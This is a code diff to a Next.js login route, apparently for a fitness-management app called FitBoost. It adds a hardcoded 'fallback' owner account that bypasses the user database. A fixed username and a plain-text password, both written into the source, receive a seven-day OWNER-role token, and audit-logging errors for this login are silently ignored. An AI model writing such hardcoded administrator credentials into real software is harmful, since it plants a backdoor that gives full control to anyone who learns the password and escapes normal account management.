@@ -41,6 +41,61 @@ export async function POST(request: Request) {
 
     const { email, password } = await request.json()
 
+    // 🔐 Fallback Account - حساب احتياطي ثابت (خارج قاعدة البيانات)
+    if (email === 'fitboost' && password === 'Amr#k#244#') {
+      const fallbackUser = {
+        id: 'fallback-fitboost-account',
+        name: 'FitBoost Admin',
+        email: 'fitboost@system.local',
+        role: 'OWNER',
+        staffId: null,
+        permissions: null
+      }
+
+      const token = jwt.sign(
+        {
+          userId: fallbackUser.id,
+          name: fallbackUser.name,
+          email: fallbackUser.email,
+          role: fallbackUser.role,
+          staffId: null,
+          permissions: null
+        },
+        JWT_SECRET,
+        { expiresIn: '7d' }
+      )
+
+      const response = NextResponse.json({
+        success: true,
+        user: fallbackUser
+      })
+
+      response.cookies.set('auth-token', token, {
+        httpOnly: true,
+        secure: process.env.NEXT_PUBLIC_APP_URL?.startsWith('https://') ?? false,
+        sameSite: 'strict',
+        path: '/',
+        maxAge: 60 * 60 * 24 * 7 // 7 days
+      })
+
+      // 📝 Audit: Fallback account login
+      try {
+        await logLogin({
+          userId: fallbackUser.id,
+          userEmail: fallbackUser.email,
+          userName: fallbackUser.name,
+          userRole: fallbackUser.role,
+          ipAddress: getIpAddress(request),
+          userAgent: getUserAgent(request)
+        })
+      } catch (auditError) {
+        // تجاهل أخطاء الـ audit log إذا كانت قاعدة البيانات معطلة
+        console.log('⚠️ Audit log skipped for fallback account')
+      }
+
+      return response
+    }
+
     // البحث عن المستخدم بالإيميل أو الاسم
     const user = await prisma.user.findFirst({
       where: {
